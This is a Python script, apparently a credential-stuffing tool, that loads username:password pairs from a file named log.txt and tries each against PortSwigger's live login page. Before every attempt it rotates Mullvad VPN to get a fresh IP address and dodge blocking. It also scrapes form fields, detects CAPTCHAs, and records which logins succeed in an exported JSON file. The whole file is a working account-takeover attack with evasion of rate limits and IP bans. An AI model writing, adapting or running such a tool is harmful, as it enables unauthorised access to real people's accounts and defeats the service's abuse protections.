#!/usr/bin/env python3
"""
PortSwigger Login Checker - Mullvad VPN Rotation
Residential IP rotation using free Mullvad VPN
"""

import requests
import time
import json
import re
import subprocess
import os
from typing import Dict, Optional
from datetime import datetime

class PortSwiggerMullvadChecker:
    """Login checker with Mullvad VPN rotation for residential IPs."""

    def __init__(self, rate_limit: float = 3.0, debug: bool = True, use_mullvad: bool = True):
        """
        Initialize with Mullvad VPN rotation.

        Args:
            rate_limit: Seconds between requests (3.0 = 0.33 req/sec)
            debug: Enable verbose debugging
            use_mullvad: Enable Mullvad VPN rotation
        """
        self.base_url = "https://login.portswigger.net"
        self.rate_limit = rate_limit
        self.last_request_time = 0
        self.debug = debug
        self.use_mullvad = use_mullvad
        self.test_results = []
        self.current_ip = None

        # Check if Mullvad is installed
        if self.use_mullvad:
            if not self._check_mullvad_installed():
                print("[ERROR] Mullvad not found. Install with: brew install mullvad-vpn")
                self.use_mullvad = False
            else:
                print("[+] Mullvad VPN detected and ready")

    def _check_mullvad_installed(self) -> bool:
        """Check if Mullvad is installed."""
        try:
            result = subprocess.run(["which", "mullvad"], capture_output=True, text=True, timeout=5)
            return result.returncode == 0
        except:
            return False

    def _rotate_mullvad(self) -> bool:
        """Rotate Mullvad VPN to get new IP."""
        try:
            if self.debug:
                print("[DEBUG] Rotating Mullvad VPN...")

            # Disconnect
            subprocess.run(["mullvad", "disconnect"], capture_output=True, timeout=10)
            time.sleep(1)

            # Connect with random location
            subprocess.run(["mullvad", "connect"], capture_output=True, timeout=30)
            time.sleep(2)

            # Get current IP
            self.current_ip = self._get_current_ip()
            if self.debug:
                print(f"[DEBUG] ✓ New IP: {self.current_ip}")

            return True

        except subprocess.TimeoutExpired:
            if self.debug:
                print("[DEBUG] Mullvad timeout")
            return False
        except Exception as e:
            if self.debug:
                print(f"[DEBUG] Mullvad error: {e}")
            return False

    def _get_current_ip(self) -> Optional[str]:
        """Get current IP address."""
        try:
            response = requests.get("https://api.ipify.org?format=json", timeout=10)
            if response.status_code == 200:
                return response.json().get("ip")
        except:
            pass
        return None

    def _enforce_rate_limit(self, extra_delay: bool = False) -> None:
        """Enforce rate limiting."""
        elapsed = time.time() - self.last_request_time
        delay = self.rate_limit + (1 if extra_delay else 0)

        if elapsed < delay:
            sleep_time = delay - elapsed
            if self.debug:
                print(f"[DEBUG] Rate limiting: sleeping {sleep_time:.1f}s")
            time.sleep(sleep_time)

        self.last_request_time = time.time()

    def _extract_form_fields_from_html(self, html_content: str) -> Dict[str, str]:
        """Extract all form fields from HTML."""
        fields = {}

        for match in re.finditer(r'<input[^>]*>', html_content):
            input_tag = match.group(0)
            name_match = re.search(r'name\s*=\s*["\']?([^"\'\s>]+)', input_tag, re.IGNORECASE)
            value_match = re.search(r'value\s*=\s*["\']([^"\']*)["\']', input_tag)

            if not value_match:
                value_match = re.search(r'value\s*=\s*([^"\'\s>]+)', input_tag)

            if name_match:
                field_name = name_match.group(1)
                field_value = value_match.group(1) if value_match else ""
                fields[field_name] = field_value

        return fields

    def _check_for_captcha(self, html_content: str) -> bool:
        """Detect CAPTCHA challenges."""
        captcha_keywords = ["hcaptcha", "recaptcha", "turnstile", "captcha", "challenge"]
        return any(keyword in html_content.lower() for keyword in captcha_keywords)

    def check_login(self, username: str, password: str) -> Dict:
        """Test login with Mullvad VPN rotation."""

        result = {
            "timestamp": datetime.now().isoformat(),
            "username": username,
            "status": "UNKNOWN",
            "ip": self.current_ip,
        }

        # Rotate Mullvad before attempt
        if self.use_mullvad:
            if not self._rotate_mullvad():
                result["status"] = "MULLVAD_ERROR"
                self.test_results.append(result)
                return result
            result["ip"] = self.current_ip

        try:
            session = requests.Session()

            # Don't use proxy, use Mullvad instead
            self._enforce_rate_limit()

            # Step 1: GET /u/login
            if self.debug:
                print(f"[DEBUG] GET /u/login via {self.current_ip}")

            init_response = session.get(
                f"{self.base_url}/u/login",
                timeout=60,
                allow_redirects=True
            )

            if self.debug:
                print(f"[DEBUG] Status: {init_response.status_code}")

            # Check for CAPTCHA
            if self._check_for_captcha(init_response.text):
                result["status"] = "CAPTCHA_DETECTED"
                self.test_results.append(result)
                return result

            # Handle redirects
            if init_response.status_code in [301, 302, 303, 307, 308]:
                redirect_url = init_response.headers.get("Location")
                if self.debug:
                    print(f"[DEBUG] Redirect: {redirect_url[:80]}")

            # Extract form fields
            form_fields = self._extract_form_fields_from_html(init_response.text)
            if not form_fields:
                form_fields = {}

            # Step 2: POST credentials
            self._enforce_rate_limit()

            payload = form_fields.copy()
            payload["username"] = username
            payload["password"] = password

            if "action" not in payload:
                payload["action"] = "default"

            if self.debug:
                print(f"[DEBUG] POST /u/login")

            response = session.post(
                f"{self.base_url}/u/login",
                data=payload,
                timeout=60,
                allow_redirects=False
            )

            if self.debug:
                print(f"[DEBUG] POST response: {response.status_code}")

            # Check for CAPTCHA again
            if self._check_for_captcha(response.text):
                result["status"] = "CAPTCHA_DETECTED"
                self.test_results.append(result)
                return result

            # Analyze response
            if response.status_code == 302:
                redirect = response.headers.get("Location", "")
                if "error" in redirect.lower():
                    result["status"] = "FAILED_LOGIN"
                else:
                    result["status"] = "SUCCESS"
                result["redirect"] = redirect

            elif response.status_code == 200:
                if "error" in response.text.lower() or "invalid" in response.text.lower():
                    result["status"] = "FAILED_LOGIN"
                else:
                    result["status"] = "LOGIN_PAGE"

            elif response.status_code == 400:
                result["status"] = "FAILED_LOGIN"
                result["error"] = "HTTP 400"

            elif response.status_code == 429:
                result["status"] = "RATE_LIMITED"

            elif response.status_code == 403:
                result["status"] = "FORBIDDEN"

            else:
                result["status"] = f"HTTP_{response.status_code}"

        except requests.exceptions.Timeout:
            result["status"] = "TIMEOUT"
        except requests.exceptions.ConnectionError:
            result["status"] = "CONNECTION_ERROR"
        except Exception as e:
            result["status"] = "ERROR"
            result["error"] = str(e)

        self.test_results.append(result)
        return result

    def check_multiple_accounts(self, credentials_list: list) -> list:
        """Test multiple accounts with Mullvad rotation."""
        print(f"\n[*] PortSwigger Login Checker - Mullvad VPN Rotation")
        print(f"[*] Testing {len(credentials_list)} account(s)")
        print(f"[*] Rate limit: {1/self.rate_limit:.2f} req/sec")
        print(f"[*] Mullvad VPN: {'ENABLED' if self.use_mullvad else 'DISABLED'}")
        print("-" * 70)

        for idx, creds in enumerate(credentials_list, 1):
            username = creds.get("username", "")
            password = creds.get("password", "")

            print(f"\n[{idx}/{len(credentials_list)}] Testing: {username}")
            result = self.check_login(username, password)

            status_symbol = "✓" if result["status"] == "SUCCESS" else "✗"
            print(f"    {status_symbol} Status: {result['status']}")
            print(f"    IP: {result.get('ip', 'Unknown')}")

            if result.get('error'):
                print(f"    Error: {result['error']}")

            # Extra delay between tests
            if idx < len(credentials_list):
                delay = 3
                print(f"    Waiting {delay}s before next test...")
                time.sleep(delay)

        print("\n" + "=" * 70)
        return self.test_results

    def get_summary(self) -> Dict:
        """Get summary statistics."""
        if not self.test_results:
            return {"total": 0}

        return {
            "total": len(self.test_results),
            "successful": sum(1 for r in self.test_results if r["status"] == "SUCCESS"),
            "failed": sum(1 for r in self.test_results if r["status"] == "FAILED_LOGIN"),
            "captcha": sum(1 for r in self.test_results if r.get("captcha_detected")),
            "errors": sum(1 for r in self.test_results if "ERROR" in r["status"] or "TIMEOUT" in r["status"]),
        }

    def export_results(self, filename: str = "portswigger_mullvad_results.json") -> None:
        """Export results to JSON."""
        with open(filename, 'w') as f:
            json.dump({
                "results": self.test_results,
                "summary": self.get_summary(),
                "timestamp": datetime.now().isoformat()
            }, f, indent=2)
        print(f"[+] Results exported to: {filename}")


def main():
    """Main entry point."""
    debug_mode = True
    use_mullvad = True  # Use Mullvad VPN

    checker = PortSwiggerMullvadChecker(
        rate_limit=3.0,  # 0.33 req/sec (very safe)
        debug=debug_mode,
        use_mullvad=use_mullvad
    )

    # Read credentials
    log_file = "log.txt"
    test_credentials = []

    try:
        with open(log_file, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if ":" in line:
                    parts = line.split(":", 1)
                    test_credentials.append({
                        "username": parts[0].strip(),
                        "password": parts[1].strip()
                    })

        if not test_credentials:
            print(f"[ERROR] No credentials in {log_file}")
            return

        print(f"[+] Loaded {len(test_credentials)} credentials\n")

        # Limit to first N for testing (optional)
        # test_credentials = test_credentials[:10]

    except FileNotFoundError:
        print(f"[ERROR] {log_file} not found")
        return

    # Run tests
    results = checker.check_multiple_accounts(test_credentials)

    # Print summary
    summary = checker.get_summary()
    print(f"\n[SUMMARY]")
    print(f"Total: {summary['total']}")
    print(f"Successful: {summary['successful']}")
    print(f"Failed: {summary['failed']}")
    print(f"CAPTCHA: {summary['captcha']}")
    print(f"Errors: {summary['errors']}")

    # Export
    checker.export_results()


if __name__ == "__main__":
    main()
